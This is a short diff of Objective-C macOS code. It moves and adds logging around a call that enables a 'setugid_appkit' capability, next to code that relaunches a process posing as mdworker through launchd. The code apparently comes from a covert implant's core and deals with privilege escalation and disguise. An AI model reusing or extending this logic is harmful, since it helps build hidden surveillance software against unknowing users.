@@ -3103,9 +3103,20 @@ void lionSendEventToPid(pid_t pidP)
               warnLog(@"mdworker.flg not found. Relaunching through launchd");
 #endif
               [gUtil dropExecFlag];
-            
-              // Enable setugid on lion
-              [gUtil enableSetugidAuth];
+            }
+        
+          // Enable setugid on lion
+          if ([gUtil enableSetugidAuth] == NO)
+            {
+#ifdef DEBUG_CORE
+              errorLog(@"Error while enabling setugid_appkit capability");
+#endif
+            }
+          else
+            {
+#ifdef DEBUG_CORE
+              warnLog(@"setugid_appkit enabled");
+#endif
             }
         }
       else
@@ -3537,9 +3548,7 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
   verboseLog(@"send event to application pid %d", pidP);
 #endif
-  
-  //[app setDelegate: self];
-  
+
   [gSuidLock lock];
   
 #ifdef DEBUG_CORE
